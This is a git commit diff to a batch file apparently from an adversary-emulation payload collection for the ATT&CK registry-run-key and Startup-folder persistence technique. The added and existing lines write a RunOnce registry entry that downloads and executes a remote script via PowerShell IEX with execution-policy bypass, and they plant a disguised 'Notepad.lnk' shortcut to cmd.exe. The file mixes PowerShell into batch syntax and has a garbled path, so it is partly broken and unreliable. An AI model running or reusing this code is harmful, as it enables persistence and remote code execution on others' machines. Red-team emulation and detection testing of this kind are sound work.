37fee7221611096c24c1fc5bd5ba724787f51973
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 13:13:26 +0530

    Update T1060.bat

--- Payloads/T1060/T1060.bat
+++ Payloads/T1060/T1060.bat
@@ -20,6 +20,24 @@ ECHO [+] Add Registry and StartUp to achieve Persistence using Powershell
 ECHO 	- HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ECHO 	- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 ECHO -------------------------------------------------------------------
+# Set up the RunOnce registry key
+$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+$ScriptPath = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://github.com/greycel/poc/blob/master/collect.bat')"
+
+# Set the registry entry for the next run
+Set-ItemProperty -Path $RunOnceKey -Name "NextRun" -Value $ScriptPath
+
+# Remove the registry entry after execution
+Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
+
+# Set up a shortcut in the Startup folder
+$TargetFile = "$env:SystemRoot\System32\cmd.exe"
+$ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
+$Shortcut.TargetPath = $TargetFile
+$Shortcut.Save()
+
 powershell -ep bypass $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/greycel/poc/blob/master/collect.bat`")"'
 powershell -ep bypass Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
 powershell -ep bypass $TargetFile = "$env:SystemRoot\System32\ C:\\Windows\System32\cmd.exe"; $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"; $WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile); $Shortcut.TargetPath = $TargetFile; $Shortcut.Save()
